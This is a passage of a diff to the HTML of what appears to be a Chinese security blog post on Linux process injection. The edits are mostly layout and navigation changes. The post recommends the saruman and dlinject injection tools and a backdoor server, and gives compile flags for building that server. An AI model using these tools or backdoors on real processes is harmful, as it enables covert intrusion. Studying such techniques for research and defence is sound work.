 <li>附上译者的测试截图<br><img src="/2018/01/28/linux进程注入/testinject.png" alt=""><h4 id="20180320更新"><a href="#20180320更新" class="headerlink" title="20180320更新"></a>20180320更新</h4></li>
-<li>昨天在看《learing linux binary analysis》的时候看到的一个工具<a href="https://github.com/kevien/saruman" target="_blank" rel="external">saruman</a>,觉得还不错，这是一个已经相对比较稳定的进程注入工具。此外这里还有一个后门server感觉还不错。</li>
+<li>昨天在看《learing linux binary analysis》的时候看到的一个工具<a href="https://github.com/kevien/saruman" target="_blank" rel="noopener">saruman</a>,觉得还不错，这是一个已经相对比较稳定的进程注入工具。此外这里还有一个后门server感觉还不错。</li>
 <li>注意在编译server的时候记得加上 -fpic -pie的编译参数，其中fpic和pie参数用于生成位置无关可执行程序，其中fpic用于编译阶段，pie用于链接阶段。<br><img src="/2018/01/28/linux进程注入/poc.png" alt=""><h4 id="20200102更新"><a href="#20200102更新" class="headerlink" title="20200102更新"></a>20200102更新</h4></li>
 <li><a href="inject a shared library (i.e. arbitrary code">https://github.com/DavidBuchanan314/dlinject</a> into a live linux process, without ptrace)</li>
 </ul>
@@ -545,8 +543,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/01/30/reverse-shell的几种方式/" rel="next" title="reverse shell的几种方式">
-                <i class="fa fa-chevron-left"></i> reverse shell的几种方式
+              <a href="/2018/01/16/从一道pentesterlab的题目说起/" rel="next" title="从一道pentesterlab的题目说起">
+                <i class="fa fa-chevron-left"></i> 从一道pentesterlab的题目说起
               </a>
             
           </div>
@@ -555,8 +553,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/01/16/从一道pentesterlab的题目说起/" rel="prev" title="从一道pentesterlab的题目说起">
-                从一道pentesterlab的题目说起 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/01/30/reverse-shell的几种方式/" rel="prev" title="reverse shell的几种方式">
+                reverse shell的几种方式 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -605,7 +603,7 @@
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
@@ -615,10 +613,8 @@
       
 
       <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/uploads/avatar.jpg"
-               alt="M0rk" />
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="M0rk">
           <p class="site-author-name" itemprop="name">M0rk</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
@@ -745,7 +741,7 @@
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
 
-<div class="copyright" >
+<div class="copyright">
   
   &copy; 
   <span itemprop="copyrightYear">2020</span>
